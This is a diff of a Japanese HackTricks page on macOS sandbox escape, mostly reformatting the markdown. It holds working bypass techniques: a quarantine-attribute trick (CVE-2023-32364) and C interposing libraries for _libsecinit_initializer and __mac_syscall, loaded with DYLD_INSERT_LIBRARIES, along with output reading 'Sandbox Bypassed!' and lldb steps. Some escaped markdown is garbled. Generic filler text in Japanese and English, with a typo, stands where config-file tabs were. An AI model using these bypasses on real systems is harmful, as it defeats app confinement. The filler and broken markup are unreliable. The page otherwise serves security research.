@@ -6,11 +6,11 @@
 
 HackTricksをサポートする他の方法：
 
-- **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-- [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
-- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見る
-- 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)をフォローする
-- **ハッキングトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。
+* **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見る
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)をフォローする
+* **ハッキングトリックを共有するには、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。
 
 </details>
 
@@ -18,25 +18,25 @@ HackTricksをサポートする他の方法：
 
 <figure><img src="../../../../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption><p>画像は<a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a>から</p></figcaption></figure>
 
-前述の画像では、**`com.apple.security.app-sandbox`**権限を持つアプリケーションが実行される際に、**サンドボックスがどのように読み込まれるか**が観察できます。
+前述の画像では、\*\*`com.apple.security.app-sandbox`\*\*権限を持つアプリケーションが実行される際に、**サンドボックスがどのように読み込まれるか**が観察できます。
 
 コンパイラは`/usr/lib/libSystem.B.dylib`をバイナリにリンクします。
 
-その後、**`libSystem.B`**は、**`xpc_pipe_routine`**がアプリの権限情報を**`securityd`**に送信するまで、他のいくつかの関数を呼び出します。Securitydはプロセスをサンドボックス内に隔離すべきかどうかをチェックし、隔離される場合は隔離されます。\
-最後に、サンドボックスは**`__sandbox_ms`**を呼び出してアクティブ化され、**`__mac_syscall`**が呼び出されます。
+その後、\*\*`libSystem.B`**は、**`xpc_pipe_routine`**がアプリの権限情報を**`securityd`**に送信するまで、他のいくつかの関数を呼び出します。Securitydはプロセスをサンドボックス内に隔離すべきかどうかをチェックし、隔離される場合は隔離されます。**\
+**最後に、サンドボックスは**`__sandbox_ms`**を呼び出してアクティブ化され、**`__mac_syscall`\*\*が呼び出されます。
 
 ## バイパス可能な方法
 
 ### 隔離属性のバイパス
 
-**サンドボックス化されたプロセスによって作成されたファイル**には、サンドボックスからの脱出を防ぐために**隔離属性**が追加されます。ただし、サンドボックス化されたアプリケーション内で**隔離属性のない`.app`フォルダを作成**できれば、アプリバンドルバイナリを**`/bin/bash`**を指すようにし、**plist**にいくつかの環境変数を追加して**`open`**を悪用して**新しいアプリをサンドボックスをバイパスして起動**することができます。
+**サンドボックス化されたプロセスによって作成されたファイル**には、サンドボックスからの脱出を防ぐために**隔離属性**が追加されます。ただし、サンドボックス化されたアプリケーション内で**隔離属性のない`.app`フォルダを作成**できれば、アプリバンドルバイナリを\*\*`/bin/bash`**を指すようにし、plistにいくつかの環境変数を追加して**`open`**を悪用して**新しいアプリをサンドボックスをバイパスして起動\*\*することができます。
 
 これは[**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)で行われたことです。
 
 {% hint style="danger" %}
-したがって、現時点では、**隔離属性のない名前で終わる`.app`フォルダ**を作成できる場合、macOSは**`.app`フォルダ**と**メイン実行可能ファイル**でのみ**隔離**属性を**チェック**するため、サンドボックスを回避できます（メイン実行可能ファイルを**`/bin/bash`**に向けます）。
+したがって、現時点では、**隔離属性のない名前で終わる`.app`フォルダ**を作成できる場合、macOSは\*\*`.app`フォルダ**と**メイン実行可能ファイル**でのみ**隔離**属性を**チェック**するため、サンドボックスを回避できます（メイン実行可能ファイルを**`/bin/bash`\*\*に向けます）。
 
-すでに実行が許可された.appバンドル（許可された実行フラグを持つ隔離xttrを持っている）の場合、それも悪用できます...ただし、今ではサンドボックス内で特権のTCC権限を持っていない限り、**`.app`**バンドル内に書き込むことはできません。
+すでに実行が許可された.appバンドル（許可された実行フラグを持つ隔離xttrを持っている）の場合、それも悪用できます...ただし、今ではサンドボックス内で特権のTCC権限を持っていない限り、\*\*`.app`\*\*バンドル内に書き込むことはできません。
 {% endhint %}
 
 ### Open機能の悪用
@@ -76,19 +76,22 @@ HackTricksをサポートする他の方法：
 
 [**この研究**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)では、サンドボックスをバイパスする2つの方法が発見されました。サンドボックスは、**libSystem**ライブラリがロードされるときにユーザーランドから適用されるため、バイナリがそのライブラリのロードを回避できれば、サンドボックスを回避できます：
 
-- バイナリが**完全に静的にコンパイル**されている場合、そのライブラリのロードを回避できます。
-- バイナリがライブラリをロードする必要がない場合（リンカーもlibSystemにあるため）、libSystemをロードする必要がありません。
+* バイナリが**完全に静的にコンパイル**されている場合、そのライブラリのロードを回避できます。
+* バイナリがライブラリをロードする必要がない場合（リンカーもlibSystemにあるため）、libSystemをロードする必要がありません。
 
 ### シェルコード
 
 ARM64の**シェルコードでさえも**、`libSystem.dylib`にリンクする必要があります。
+
 ```bash
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
+
 ### 権限
 
-特定の**権限**がアプリケーションにある場合、**サンドボックス**で**許可されている****アクション**があっても、注意してください。
+特定の**権限**がアプリケーションにある場合、**サンドボックス**で**許可されている\*\*\*\*アクション**があっても、注意してください。
+
 ```scheme
 (when (entitlement "com.apple.security.network.client")
 (allow network-outbound (remote ip))
@@ -98,15 +101,17 @@ ld: dynamic executables or dylibs must link with libSystem.dylib for architectur
 (global-name "com.apple.cfnetwork.cfnetworkagent")
 [...]
 ```
+
 ### インターポスティングバイパス
 
 **インターポスティング**に関する詳細情報は、以下を参照してください：
 
-{% content-ref url="../../../mac-os-architecture/macos-function-hooking.md" %}
-[macos-function-hooking.md](../../../mac-os-architecture/macos-function-hooking.md)
+{% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
+[macos-function-hooking.md](../../../macos-proces-abuse/macos-function-hooking.md)
 {% endcontent-ref %}
 
 #### サンドボックスを回避するために `_libsecinit_initializer` をインターポストする
+
 ```c
 // gcc -dynamiclib interpose.c -o interpose.dylib
 
@@ -130,6 +135,7 @@ DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 _libsecinit_initializer called
 Sandbox Bypassed!
 ```
+
 #### サンドボックスを回避するために`__mac_syscall`をインターポストする
 
 {% code title="interpose.c" %}
@@ -165,6 +171,7 @@ __attribute__((used)) static const struct interpose_sym interposers[] __attribut
 };
 ```
 {% endcode %}
+
 ```bash
 DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
 
@@ -176,35 +183,34 @@ __mac_syscall invoked. Policy: Quarantine, Call: 87
 __mac_syscall invoked. Policy: Sandbox, Call: 4
 Sandbox Bypassed!
 ```
+
 ### Sandboxのデバッグとバイパス方法
 
 サンドボックスされるはずのアプリケーションをコンパイルしましょう：
 
-{% tabs %}
-{% tab title="sand.c" %}
 ```c
 #include <stdlib.h>
 int main() {
 system("cat ~/Desktop/del.txt");
 }
 ```
-{% endtab %}
 
-{% tab title="entitlements.xml" %}以下は、macOSサンドボックスのデバッグとバイパスに関する情報です。
+以下は、macOSサンドボックスのデバッグとバイパスに関する情報です。
 
-## macOSサンドボックスのデバッグとバイパス
+### macOSサンドボックスのデバッグとバイパス
 
 macOSサンドボックスをバイパスするためのいくつかの手法があります。これには、デバッグ技術やエスケーレーション技術が含まれます。サンドボックスをバイパスするためには、権限昇格やセキュリティ保護の回避が必要です。
 
-### デバッグ技衧
+#### デバッグ技衧
 
 macOSサンドボックスをバイパスするためには、デバッグ技術を使用することができます。デバッグ技術を使用すると、サンドボックス内のプロセスを解析し、セキュリティ保護を回避することができます。
 
-### エスカレーション技術
+#### エスカレーション技術
 
 エスカレーション技術を使用すると、特権昇格を行うことができます。特権昇格を行うことで、サンドボックス内の制限を回避し、システム全体にアクセスできるようになります。
 
-macOSサンドボックスのデバッグとバイパスは、セキュリティ破壊行為に該当するため、違法行為となります。これらの手法は、正当な目的でのみ使用すべきです。{% endtab %}
+macOSサンドボックスのデバッグとバイパスは、セキュリティ破壊行為に該当するため、違法行為となります。これらの手法は、正当な目的でのみ使用すべきです。
+
 ```xml
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
 <dict>
@@ -213,13 +219,10 @@ macOSサンドボックスのデバッグとバイパスは、セキュリティ
 </dict>
 </plist>
 ```
-{% endtab %}
 
-{% tab title="Info.plist" %}  
+### macOS Sandbox Debug and Bypass
 
-## macOS Sandbox Debug and Bypass
-
-### Debugging the macOS Sandbox
+#### Debugging the macOS Sandbox
 
 To debug the macOS sandbox, you can use the `sandbox-exec` tool with the `-D` flag to enable debug mode. This will print detailed debug information about the sandbox operations.
 
@@ -227,13 +230,12 @@ To debug the macOS sandbox, you can use the `sandbox-exec` tool with the `-D` fl
 sandbox-exec -D
 ```
 
-### Bypassing the macOS Sandbox
+#### Bypassing the macOS Sandbox
 
 To bypass the macOS sandbox, you can use various techniques such as exploiting vulnerabilities in the sandbox profile, injecting code into a process with sandbox permissions, or using kernel vulnerabilities to disable sandbox restrictions.
 
-It is important to note that bypassing the macOS sandbox is a serious security issue and should only be done for educational or research purposes in controlled environments. 
+It is important to note that bypassing the macOS sandbox is a serious security issue and should only be done for educational or research purposes in controlled environments.
 
-{% endtab %}
 ```xml
 <plist version="1.0">
 <dict>
@@ -244,8 +246,6 @@ It is important to note that bypassing the macOS sandbox is a serious security i
 </dict>
 </plist>
 ```
-{% endtab %}
-{% endtabs %}
 
 その後、アプリをコンパイルします：
 
@@ -262,14 +262,16 @@ codesign -s <cert-name> --entitlements entitlements.xml sand
 {% endcode %}
 
 {% hint style="danger" %}
-アプリは**`~/Desktop/del.txt`**ファイルを**読み取ろうとします**が、**Sandboxが許可しない**でしょう。\
+アプリは\*\*`~/Desktop/del.txt`**ファイルを**読み取ろうとします\*\*が、**Sandboxが許可しない**でしょう。\
 Sandboxがバイパスされると、ファイルを読み取ることができるように、そこにファイルを作成してください：
+
 ```bash
 echo "Sandbox Bypassed" > ~/Desktop/del.txt
 ```
 {% endhint %}
 
 アプリケーションをデバッグして、サンドボックスがいつ読み込まれるかを確認しましょう：
+
 ```bash
 # Load app in debugging
 lldb ./sand
@@ -346,6 +348,7 @@ Process 2517 resuming
 Sandbox Bypassed!
 Process 2517 exited with status = 0 (0x00000000)
 ```
+
 {% hint style="warning" %}
 **サンドボックスをバイパスしても、TCC** はユーザーにデスクトップからファイルを読み取るプロセスを許可するかどうか尋ねます。
 {% endhint %}
@@ -365,7 +368,7 @@ HackTricks をサポートする他の方法:
 * **HackTricks で企業を宣伝したい** または **HackTricks を PDF でダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
 * [**公式 PEASS & HackTricks スワッグ**](https://peass.creator-spring.com) を手に入れる
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
-* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) をフォローする。
+* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live) をフォローする。
 * **HackTricks** と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の GitHub リポジトリに PR を提出して、あなたのハッキングトリックを共有してください。
 
 </details>
